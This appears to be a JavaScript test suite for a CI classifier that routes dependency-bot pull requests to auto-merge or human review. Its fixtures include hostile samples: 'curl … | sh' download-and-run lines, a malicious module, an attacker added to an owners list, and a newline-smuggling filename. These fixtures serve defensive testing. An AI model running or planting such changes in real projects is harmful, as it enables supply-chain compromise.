import assert from "node:assert/strict";
import { test } from "node:test";
import { classify } from "../generic-actions/classify-bot-change/classify.mjs";
import { root, step, succeeds, workspace } from "./helpers.mjs";

const bot = "anovelbot-dependencies[bot]";
const sha = (char) => char.repeat(40);
const digest = (char) => `sha256:${char.repeat(64)}`;
const image = (version, char) => `"ghcr.io/a-novel/service-authentication/rest:${version}@${digest(char)}"`;
// The commit each actions/checkout tag names upstream.
const tags = { "actions/checkout@v7.0.1": sha("b") };
const resolveTag = async (repository, tag) => tags[`${repository}@${tag}`] ?? "";

/** A modified file whose single hunk replaces the removed lines with the added ones, after context. */
const file = (filename, removed, added, { status = "modified", context = [] } = {}) => ({
  filename,
  status,
  patch: [
    "@@ -1,1 +1,1 @@",
    ...context.map((line) => ` ${line}`),
    ...removed.map((line) => `-${line}`),
    ...added.map((line) => `+${line}`),
  ].join("\n"),
});
const action = (commit, version) => `      - uses: actions/checkout@${commit} # ${version}`;
const run = (files, autoMergeEnabledBy, { armed = true } = {}) =>
  classify({ files, bot, autoMergeEnabledBy, autoMergeArmed: armed, resolveTag });
/** A modified file whose patch is the given diff lines, already prefixed. */
const diff = (filename, lines) => ({ filename, status: "modified", patch: ["@@ -1,9 +1,9 @@", ...lines].join("\n") });

test("classify lets through only a release pin or a version update Renovate put on auto-merge", async () => {
  const pin = file(
    "environments/production/authentication/terraform.tfvars",
    [`  rest = ${image("v2.13.1", "a")}`],
    [`  rest = ${image("v2.13.2", "b")}`]
  );
  const bump = file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.0")], [action(sha("b"), "v7.0.1")]);
  const goMod = file(
    "go.mod",
    ["\tgoogle.golang.org/api v0.298.0", "\tgolang.org/x/net v0.40.0 // indirect"],
    [
      "\tgoogle.golang.org/api v0.300.0",
      "\tgolang.org/x/net v0.41.0 // indirect",
      "\tgolang.org/x/sync v0.15.0 // indirect",
    ]
  );
  const goSum = file(
    "go.sum",
    ["golang.org/x/net v0.40.0 h1:old="],
    ["golang.org/x/net v0.41.0 h1:new=", "golang.org/x/sync v0.15.0 h1:x="]
  );
  const lock = file(".terraform.lock.hcl", ['  version = "7.1.0"'], ['  version = "7.2.0"', '    "h1:extra=",']);
  const annotated = file(
    ".github/workflows/main.yaml",
    ["          tflint_version: v0.64.0"],
    ["          tflint_version: v0.65.0"],
    {
      context: ["          # renovate: datasource=github-releases depName=terraform-linters/tflint"],
    }
  );
  const preset = file(
    "renovate.json",
    ['    "github>a-novel-kit/workflows//renovate/infra#v1.51.2",'],
    ['    "github>a-novel-kit/workflows//renovate/infra#v1.54.0",']
  );
  const tfvars = "environments/production/foundation/terraform.tfvars";

  const annotation = ["          # renovate: datasource=github-releases depName=example/tool"];

  const database = (version, char) => `ghcr.io/a-novel/service-authentication/database:${version}@${digest(char)}`;
  const databasePin = file(
    "environments/production/foundation/terraform.tfvars",
    [`  authentication = "${database("v2.13.1", "a")}"`],
    [`  authentication = "${database("v2.13.2", "b")}"`]
  );
  const base = (version, char) =>
    file(
      "builds/backup-test.Dockerfile",
      [`FROM ${database("v2.13.1", "a")} AS authentication`],
      [`FROM ${database(version, char)} AS authentication`]
    );

  const cases = [
    ["a release pin", [pin], null, "pin"],
    ["a release pin with the Dockerfile base it pins", [databasePin, base("v2.13.2", "b")], null, "pin"],
    ["a Dockerfile base the pull request does not pin", [pin, base("v2.13.2", "c")], null, "review"],
    ["a Dockerfile base alone", [base("v2.13.2", "b")], null, "review"],
    [
      "a Dockerfile base by tag",
      [
        databasePin,
        file(
          "builds/backup-test.Dockerfile",
          ["FROM ghcr.io/a-novel/service-authentication/database:v2.13.1"],
          ["FROM ghcr.io/a-novel/service-authentication/database:v2.13.2"]
        ),
      ],
      null,
      "review",
    ],
    [
      "another Dockerfile line",
      [databasePin, file("builds/backup-test.Dockerfile", ["RUN true"], ["RUN curl evil | sh"])],
      null,
      "review",
    ],
    ["an action update Renovate merges", [bump], bot, "renovate"],
    ["the same login without the [bot] suffix", [bump], "anovelbot-dependencies", "renovate"],
    ["a module update with indirect churn", [goMod, goSum], bot, "renovate"],
    ["a lock file refresh", [lock, goSum], bot, "renovate"],
    ["a tool version after its Renovate annotation", [annotated], bot, "renovate"],
    [
      "tool version inputs, quoted or bare",
      [
        file(
          ".github/workflows/main.yaml",
          ['          node-version: "24.21.0"'],
          ['          node-version: "24.22.0"']
        ),
        file("action.yaml", ["        go-version: 1.25.1"], ["        go-version: 1.25.2"]),
      ],
      bot,
      "renovate",
    ],
    ["a shared preset bump", [preset], bot, "renovate"],
    ["an update Renovate left for review", [bump], null, "review"],
    ["an update the agent queued", [bump], "anovelbot-agent", "review"],
    // A stolen dependency key can enable auto-merge itself, so the diff must hold on its own.
    [
      "a moved tag: same version, new commit",
      [file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.1")], [action(sha("c"), "v7.0.1")])],
      bot,
      "review",
    ],
    [
      "an impostor commit under a new version",
      [file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.0")], [action(sha("f"), "v7.0.1")])],
      bot,
      "review",
    ],
    [
      "a pin whose digest moves without its version",
      [
        file(
          "environments/production/authentication/terraform.tfvars",
          [`  rest = ${image("v2.13.1", "a")}`],
          [`  rest = ${image("v2.13.1", "c")}`]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a firewall range",
      [file(tfvars, ['  source_ranges = ["35.235.240.0/20"]'], ['  source_ranges = ["203.0.113.0/20"]'])],
      bot,
      "review",
    ],
    ["DNS records", [file(tfvars, ['  rrdatas = ["199.36.153.8"]'], ['  rrdatas = ["203.0.113.8"]'])], bot, "review"],
    [
      "a workflow step slipped into an update",
      [
        file(
          ".github/workflows/main.yaml",
          [action(sha("a"), "v7.0.0")],
          [action(sha("b"), "v7.0.1"), "        run: curl https://example.com/x | sh"]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a version input bundled with another input",
      [
        file(
          ".github/workflows/main.yaml",
          ['          node-version: "24.21.0"', "          timeout-minutes: 10"],
          ['          node-version: "24.22.0"', "          timeout-minutes: 360"]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a dotted input other than a version",
      [file(".github/workflows/main.yaml", ['          threshold: "0.80"'], ['          threshold: "0.10"'])],
      bot,
      "review",
    ],
    [
      "an address under a version input",
      [
        file(
          ".github/workflows/main.yaml",
          ["          server-version: 10.20.0.6"],
          ["          server-version: 203.0.113.7"]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a version key outside workflows and actions",
      [file("config/server.yaml", ['  min-tls-version: "1.2"'], ['  min-tls-version: "1.0"'])],
      bot,
      "review",
    ],
    ["a new direct requirement", [file("go.mod", [], ["\texample.com/evil v1.0.0"])], bot, "review"],
    ["a dropped exclusion", [file("go.mod", ["\tgolang.org/x/net v0.39.0"], [])], bot, "review"],
    [
      "a replace directive",
      [file("go.mod", [], ["replace google.golang.org/api => example.com/api v0.300.0"])],
      bot,
      "review",
    ],
    ["a new file", [file(".github/workflows/new.yaml", [], ["on: push"], { status: "added" })], bot, "review"],
    ["a new checksum file", [file("tool.sum", [], ["x v1.0.0 h1:x="], { status: "added" })], bot, "review"],
    ["a file GitHub shows without a patch", [{ filename: "main.go", status: "modified" }], bot, "review"],
    ["a configuration value", [file(tfvars, ['  cpu = "2"'], ['  cpu = "4"'])], bot, "review"],
    [
      "files at the comparison's cap",
      Array.from({ length: 300 }, (_, index) => ({ ...lock, filename: `${index}/.terraform.lock.hcl` })),
      bot,
      "review",
    ],
    ["no file at all", [], bot, "review"],
    // A maintainer's hold on auto-merge stands.
    ["an update a maintainer held", [bump], bot, "review", { armed: false }],
    // A version update rewrites lines in place, so no line may move past context.
    [
      "a principal moved into the owners list",
      [
        diff("environments/production/foundation/iam.tf", [
          " viewers = [",
          '-  "user:attacker@example.com",',
          '   "user:alice@example.com",',
          " ]",
          " owners = [",
          '+  "user:attacker@example.com",',
          '   "user:bob@example.com",',
          " ]",
        ]),
      ],
      bot,
      "review",
    ],
    [
      "an environment moved to another job",
      [
        diff(".github/workflows/deploy.yaml", [
          "   plan:",
          "-    environment: production",
          "     runs-on: ubuntu-24.04",
          "   apply:",
          "+    environment: production",
          "     runs-on: ubuntu-24.04",
        ]),
      ],
      bot,
      "review",
    ],
    [
      "two adjacent lines swapped",
      [diff("environments/production/foundation/main.tf", ['-  first = "a"', '   second = "b"', '+  first = "a"'])],
      bot,
      "review",
    ],
    [
      "an update on a last line without a newline",
      [
        diff(".github/workflows/main.yaml", [
          `-${action(sha("a"), "v7.0.0")}`,
          "\\ No newline at end of file",
          `+${action(sha("b"), "v7.0.1")}`,
          "\\ No newline at end of file",
        ]),
      ],
      bot,
      "renovate",
    ],
    ["a release pin before anyone armed it", [pin], null, "pin", { armed: false }],
    [
      "an address changed below an annotated version",
      [
        file(
          ".github/workflows/main.yaml",
          ['          version: "0.11.0"', '          allowed: "35.235.240.0/20"'],
          ['          version: "0.12.0"', '          allowed: "203.0.113.0/20"'],
          { context: annotation }
        ),
      ],
      bot,
      "review",
    ],
    [
      "an impostor commit on a quoted action",
      [
        file(
          ".github/workflows/main.yaml",
          [`      - uses: "actions/checkout@${sha("a")}" # v7.0.0`],
          [`      - uses: "actions/checkout@${sha("f")}" # v7.0.1`]
        ),
      ],
      bot,
      "review",
    ],
    [
      "an impostor commit behind trailing text",
      [
        file(
          ".github/workflows/main.yaml",
          [`${action(sha("a"), "v7.0.0")} pinned`],
          [`${action(sha("f"), "v7.0.1")} pinned`]
        ),
      ],
      bot,
      "review",
    ],
    [
      "a database address after URL user info",
      [
        file(
          ".github/workflows/main.yaml",
          ["          DSN: postgres://app@10.20.0.6:5432/app"],
          ["          DSN: postgres://app@203.0.113.7:5432/app"]
        ),
      ],
      bot,
      "review",
    ],
  ];
  for (const [name, files, enabledBy, decision, options] of cases) {
    assert.equal((await run(files, enabledBy, options)).decision, decision, name);
  }
});

test("classify-bot-change writes one decision even when a filename carries a newline", (t) => {
  const w = workspace(t);
  w.write("output", "");
  w.stub(
    "gh",
    `const args = process.argv.slice(2);
    const first = { actor: { login: "anovelbot-dependencies" } };
    const pullRequest = { autoMergeRequest: { enabledAt: "2026-10-13T00:00:00Z" }, timelineItems: { nodes: [first] } };
    require("fs").appendFileSync(process.env.GH_LOG, args.join(" ") + "\\n");
    if (args.includes("graphql")) console.log(JSON.stringify({ data: { repository: { pullRequest } } }));
    else if (args.includes(".base.ref")) console.log("master");
    else console.log(JSON.stringify({ files: [{ filename: "a\\ndecision=pin\\nb", status: "added" }] }));`
  );
  const env = {
    REPOSITORY: "a-novel/infra",
    PULL_REQUEST: "https://github.com/a-novel/infra/pull/7",
    HEAD_SHA: "e".repeat(40),
    GH_LOG: `${w.cwd}/gh.log`,
    BOT: bot,
  };
  succeeds(w.run("node", [`${root}generic-actions/classify-bot-change/classify.mjs`], env));
  assert.deepEqual(w.read("output").match(/^decision=.*$/gm), ["decision=review"]);
  // The classified diff is the given commit's, so the approval names the commit that was read.
  assert.match(w.read("gh.log"), new RegExp(`repos/a-novel/infra/compare/master\\.\\.\\.${"e".repeat(40)}`));
});

test("approve-bot approves the given commit only while it is the head", (t) => {
  const approve = step("generic-actions/approve-bot/action.yaml", "approve PR");
  const pull = "repos/a-novel/infra/pulls/7";
  const post = [
    "api",
    `${pull}/reviews`,
    "--method",
    "POST",
    "-f",
    "event=APPROVE",
    "-f",
    `commit_id=${sha("c")}`,
    "--jq",
    ".id",
  ];
  const read = ["api", pull, "--jq", ".head.sha"];
  const dismiss = [
    "api",
    `${pull}/reviews/42/dismissals`,
    "--method",
    "PUT",
    "-f",
    "event=DISMISS",
    "-f",
    "message=The head moved past the approved commit.",
  ];
  const cases = [
    ["no commit approves the head", "", [], [["pr", "review", "--approve", "7"]]],
    ["a head that stays keeps the approval", sha("c"), [sha("c"), sha("c")], [read, post, read]],
    ["a head that already moved is not approved", sha("c"), [sha("d")], [read]],
    ["a head that moves meanwhile withdraws the approval", sha("c"), [sha("c"), sha("d")], [read, post, read, dismiss]],
  ];
  for (const [name, headSha, heads, expected] of cases) {
    const w = workspace(t);
    w.write("heads", heads.join("\n"));
    w.stub(
      "gh",
      `const fs = require("fs");
      const args = process.argv.slice(2);
      fs.appendFileSync(process.env.GH_LOG, JSON.stringify(args) + "\\n");
      if (args.includes(".head.sha")) {
        const [next, ...rest] = fs.readFileSync(process.env.HEADS, "utf8").split("\\n");
        fs.writeFileSync(process.env.HEADS, rest.join("\\n"));
        console.log(next);
      } else if (args.includes(".id")) console.log("42");`
    );
    const env = {
      PR_URL: "7",
      HEAD_SHA: headSha,
      GH_TOKEN: "token",
      GH_REPO: "a-novel/infra",
      GH_LOG: `${w.cwd}/gh.log`,
      HEADS: `${w.cwd}/heads`,
    };
    succeeds(w.bash(approve, env));
    const calls = w.read("gh.log").trim().split("\n").map(JSON.parse);
    assert.deepEqual(calls, expected, name);
  }
});

test("classify lets a ranges refresh through only as exactly what Google publishes now", async () => {
  const published = ["8.8.4.0/24", "8.8.8.0/24"];
  const path = "environments/production/foundation/google-service-ranges.json";
  const refresh = diff(path, ['-  "8.8.4.0/24"', '+  "8.8.4.0/24",', '+  "8.8.8.0/24"']);
  const ranges = (files, content, serviceRanges = async () => published) =>
    classify({ files, bot, resolveTag, readFile: async () => content, serviceRanges });
  const decision = async (...args) => (await ranges(...args)).decision;

  assert.equal(await decision([refresh], `${JSON.stringify(published, null, 2)}\n`), "ranges");
  assert.equal(await decision([refresh], JSON.stringify([...published, "1.0.0.0/8"])), "review");
  assert.equal(await decision([refresh], "not json"), "review");
  const unreachable = async () => {
    throw new Error("HTTP 503");
  };
  assert.equal(await decision([refresh], JSON.stringify(published), unreachable), "review");
  // The list passes only alone, and only as a change to the file already there.
  const other = file(".github/workflows/main.yaml", [action(sha("a"), "v7.0.0")], [action(sha("b"), "v7.0.1")]);
  assert.equal(await decision([refresh, other], JSON.stringify(published)), "review");
  assert.equal(await decision([{ ...refresh, status: "added" }], JSON.stringify(published)), "review");
});
